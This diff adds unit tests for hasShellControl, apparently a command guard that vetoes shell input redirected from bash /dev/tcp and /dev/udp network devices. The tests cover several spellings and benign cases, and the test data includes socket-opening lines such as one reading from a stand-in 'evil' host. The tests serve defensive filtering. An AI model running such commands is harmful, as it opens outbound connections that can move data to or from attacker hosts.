@@ -143,3 +143,43 @@ describe('hasShellControl - #1023 quote-aware veto', () => {
     );
   });
 });
+
+// #1063: input redirection FROM a bash network device opens an OUTBOUND socket
+// and must veto on the matched-segment path, not only on the while-loop
+// grammar residue where the C6 fix (#1062) first added the guard.
+describe('hasShellControl - #1063 network-device input redirect', () => {
+  test('MUST VETO: input redirect from /dev/tcp and /dev/udp', () => {
+    expect(hasShellControl('cat < /dev/tcp/evil/443')).toBe(true);
+    expect(hasShellControl('cat < /dev/udp/host/53')).toBe(true);
+  });
+
+  test('MUST VETO: the fd-numbered and no-space spellings', () => {
+    expect(hasShellControl('cat 0< /dev/tcp/h/1')).toBe(true);
+    expect(hasShellControl('cat 3< /dev/tcp/h/1')).toBe(true);
+    expect(hasShellControl('cat</dev/tcp/h/1')).toBe(true);
+  });
+
+  test('MUST NOT VETO: an ordinary file input redirect (reads, never sockets)', () => {
+    expect(hasShellControl('grep x < list.txt')).toBe(false);
+    expect(hasShellControl('cat < ./config.ini')).toBe(false);
+  });
+
+  test('MUST NOT VETO: benign /dev targets that are not sockets', () => {
+    expect(hasShellControl('cat < /dev/null')).toBe(false);
+    expect(hasShellControl('cat < /dev/stdin')).toBe(false);
+  });
+
+  test('a here-string of a /dev/tcp literal is not a socket open', () => {
+    // `<<<` feeds the literal string to stdin; bash does not apply network-
+    // device magic to here-strings, only to `<`/`>` redirections.
+    expect(hasShellControl('cat <<< /dev/tcp/h/p')).toBe(false);
+  });
+
+  test('the case/prefix variants bash treats as ordinary files are not vetoed here', () => {
+    // Only the exact case-sensitive `/dev/tcp/`|`/dev/udp/` prefix sockets in
+    // bash; these all fall to a file open, so refusing them would be noise.
+    expect(hasShellControl('cat < /DEV/TCP/h/1')).toBe(false);
+    expect(hasShellControl('cat < /dev/tcpx/h/1')).toBe(false);
+    expect(hasShellControl('cat < x/dev/tcp/h/1')).toBe(false);
+  });
+});
